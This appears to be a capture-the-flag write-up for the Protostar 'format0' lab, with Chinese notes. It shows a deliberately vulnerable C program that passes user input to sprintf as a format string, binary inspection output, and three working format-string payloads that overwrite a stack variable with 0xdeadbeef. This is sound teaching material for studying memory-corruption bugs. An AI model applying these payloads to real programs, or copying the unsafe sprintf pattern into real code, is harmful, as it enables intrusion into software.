```
# Format Zero

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

**Hints**

- This level should be done in less than 10 bytes of input.
- “Exploiting format string vulnerabilities”

This level is at /opt/protostar/bin/format0
```

**Source code**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
---

**checksec**

```c
└─$ checksec --file=format0 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               1               format0
```

```c
└─$ objdump -t -j .text format0 

format0:     file format elf32-i386

SYMBOL TABLE:
08048340 l    d  .text  00000000              .text
08048370 l     F .text  00000000              __do_global_dtors_aux
080483d0 l     F .text  00000000              frame_dummy
080484c0 l     F .text  00000000              __do_global_ctors_aux
08048450 g     F .text  00000005              __libc_csu_fini
08048340 g     F .text  00000000              _start
08048460 g     F .text  0000005a              __libc_csu_init
080483f4 g     F .text  00000037              vuln
080484ba g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
0804842b g     F .text  0000001b              main
```

**本题是把接受的参数打印到了buffer中**

**python2**
```c
└─$ ./format0 `python2 -c 'print("%64s\xef\xbe\xad\xde")'`
you have hit the target correctly :)
```

**python3 **
**中`print()` 函数默认会在输出末尾自动添加一个换行符 `\n` (0x0A)**
**`sys.stdout.buffer.write()` 直接写入字节流，不添加任何额外字符**
```c
└─$ ./format0 `python3 -c "import sys; sys.stdout.buffer.write(b'%64d\xef\xbe\xad\xde')"`
you have hit the target correctly :)
```

**echo**
**`-n` 表示不换行，`-e` 表示解释转义字符（如 `\xef`）**
```c
└─$ ./format0 $(echo -ne '%64d\xef\xbe\xad\xde')
you have hit the target correctly :)
```